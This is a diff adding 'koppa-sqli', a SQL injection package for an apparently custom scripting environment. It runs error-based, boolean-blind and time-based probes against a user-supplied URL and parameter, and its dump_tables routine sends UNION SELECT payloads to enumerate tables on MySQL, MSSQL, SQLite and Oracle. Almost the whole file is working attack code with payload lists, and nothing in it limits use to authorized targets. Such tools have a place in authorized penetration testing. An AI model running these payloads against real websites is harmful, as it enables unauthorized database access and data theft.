@@ -1,0 +1,93 @@
+## koppa package: koppa-sqli
+## version: 1.0.0
+## description: SQL Injection tester — error-based, blind, time-based, union, dump tables
+## author: KOPPA-OS
+## tags: web, sqli, database, injection
+
+import net, log, sys
+
+let PAYLOADS_ERROR = [
+    "'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
+    "') OR ('1'='1", "1' ORDER BY 1--", "1' ORDER BY 2--",
+    "1' UNION SELECT NULL--", "1 AND 1=2"
+]
+let PAYLOADS_TIME = [
+    "'; WAITFOR DELAY '0:0:5'--",
+    "' OR SLEEP(5)--",
+    "1; SELECT SLEEP(5)--",
+    "' AND SLEEP(5) AND '1'='1"
+]
+
+fn test_error(url, param) {
+    log.info("[*] Error-based SQLi: " + url + " ?" + param + "=...")
+    let found = []
+    for pay in PAYLOADS_ERROR {
+        let resp = net.http_get(url + "?" + param + "=" + net.url_encode(pay))
+        let body = resp.body.lower()
+        for sig in ["sql syntax", "mysql_fetch", "ora-01756", "unterminated", "odbc", "sqlite"] {
+            if body.contains(sig) {
+                log.ok("[+] Vulnerable! Payload: " + pay + "  Sig: " + sig)
+                found.push({ payload: pay, sig: sig })
+                break
+            }
+        }
+    }
+    if found.len() == 0 { log.muted("[-] No error-based SQLi found") }
+    return found
+}
+
+fn test_blind(url, param, true_str) {
+    log.info("[*] Boolean blind SQLi: " + url)
+    let true_pay  = "' AND 1=1--"
+    let false_pay = "' AND 1=2--"
+    let r_true  = net.http_get(url + "?" + param + "=" + net.url_encode(true_pay))
+    let r_false = net.http_get(url + "?" + param + "=" + net.url_encode(false_pay))
+    if r_true.body.contains(true_str) and not r_false.body.contains(true_str) {
+        log.ok("[+] Boolean blind SQLi confirmed!")
+        return true
+    }
+    log.muted("[-] No boolean blind SQLi detected")
+    return false
+}
+
+fn test_time(url, param) {
+    log.info("[*] Time-based blind SQLi: " + url)
+    for pay in PAYLOADS_TIME {
+        let t0   = sys.time_ms()
+        net.http_get(url + "?" + param + "=" + net.url_encode(pay))
+        let elapsed = sys.time_ms() - t0
+        if elapsed > 4500 {
+            log.ok("[+] Time-based SQLi! Payload: " + pay + "  (" + elapsed + "ms)")
+            return true
+        }
+    }
+    log.muted("[-] No time-based SQLi detected")
+    return false
+}
+
+fn dump_tables(url, param, db_type) {
+    log.info("[*] Dumping tables via UNION SQLi...")
+    let queries = {
+        "mysql":  "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--",
+        "mssql":  "' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U'--",
+        "sqlite": "' UNION SELECT tbl_name,2,3 FROM sqlite_master WHERE type='table'--",
+        "oracle": "' UNION SELECT table_name,2,3 FROM all_tables--"
+    }
+    let pay  = queries[db_type] or queries["mysql"]
+    let resp = net.http_get(url + "?" + param + "=" + net.url_encode(pay))
+    log.ok("[+] Response:\n" + resp.body)
+}
+
+fn main(args) {
+    log.info("[koppa-sqli] SQL Injection Tester v1.0")
+    let url   = args[0] or sys.prompt("URL: ")
+    let param = args[1] or sys.prompt("Parameter: ")
+    let mode  = args[2] or "all"
+    if mode == "error" or mode == "all" { test_error(url, param) }
+    if mode == "blind" or mode == "all" {
+        let ts = args[3] or sys.prompt("True string (text that appears on valid response): ")
+        test_blind(url, param, ts)
+    }
+    if mode == "time"  or mode == "all" { test_time(url, param) }
+    if mode == "dump"  { dump_tables(url, param, args[3] or "mysql") }
+}
